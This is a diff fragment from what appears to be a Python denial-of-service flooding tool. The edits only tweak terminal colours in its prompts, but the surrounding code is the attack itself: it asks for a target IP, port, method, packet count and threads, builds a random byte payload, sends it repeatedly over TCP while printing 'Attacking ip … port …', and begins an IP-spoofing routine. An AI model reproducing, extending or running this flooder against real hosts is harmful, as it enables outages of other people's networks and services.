@@ -190,11 +190,11 @@ ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
 print(ip)
 print()
 
-ip = str(input("\033[94m IP target \033[1;31;40m  ==> : "))
-port = int(input(" \033[94m Port Target \033[1;31;40m ==> : "))
-choice = str(input(" \033[94m Methods \033[1;31;40m  ==> : "))
-times = int(input(" \033[94m Paket \033[1;31;40m  ==> : "))
-threads = int(input("\033[94m Threads \033[1;31;40m  ==> : "))
+ip = str(input("\033[94m IP target \033[1;31;40m  ==> : \033[0m"))
+port = int(input(" \033[94m Port Target \033[1;31;40m ==> : \033[0m"))
+choice = str(input(" \033[94m Methods \033[1;31;40m  ==> : \033[0m"))
+times = int(input(" \033[94m Paket \033[1;31;40m  ==> : \033[0m"))
+threads = int(input("\033[94m Threads \033[1;31;40m  ==> : \033[0m"))
 
 def run():
 	data = random._urandom(573)
@@ -219,7 +219,7 @@ def tcp():
 				s.send(data)
 		except:
 			s.close()
-			print("\033[1;31;40m 0xF1 Attacking ip %s port %s"%(ip,port))
+			print("\033[33m 0xF1 Attacking ip %s port %s"%(ip,port))
 
 def spoofer():
     addr = [192, 168, 0, 1]
